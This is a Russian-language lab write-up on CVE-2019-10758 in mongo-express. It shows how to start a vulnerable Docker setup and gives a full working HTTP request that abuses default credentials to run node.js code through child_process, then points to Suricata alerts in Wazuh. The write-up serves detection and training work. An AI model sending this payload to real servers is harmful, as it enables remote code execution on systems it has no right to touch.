# CVE-2019-10758

Mongo-express до версии 0.54.0 уязвим для удаленного выполнения кода через конечные точки, использующие метод toBSON. Если злоумышленник может успешно войти в систему или целевой сервер не изменил пароль учетной записи по умолчанию (admin:pass), он может выполнить произвольный код node.js.

### Эксплуатация уязвимости

Для запуска уязвимой среды выполните команду:

```
docker compose up -d 
```

После запуска по адресу http://ваш-ip:8081 будет доступна веб-страница mongo-express

<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

Для реализации уязвимости отправьте следующий POST-запрос с полезной нагрузкой

```
POST /checkValid HTTP/1.1
Host: ваш-ip:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Authorization: Basic YWRtaW46cGFzcw==
Content-Type: application/x-www-form-urlencoded
Content-Length: 128

document=this.constructor.constructor("return process")().mainModule.require("child_process").execSync("touch /tmp/success")
```

<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

В результате был создан файл /tmp/success

<figure><img src="../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

В Wazuh (https://ваш-ip/app/wazuh) мы можем увидеть соответствующие алерты от IDS Suricata об эксплуатации данной уязвимости.

<figure><img src="../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
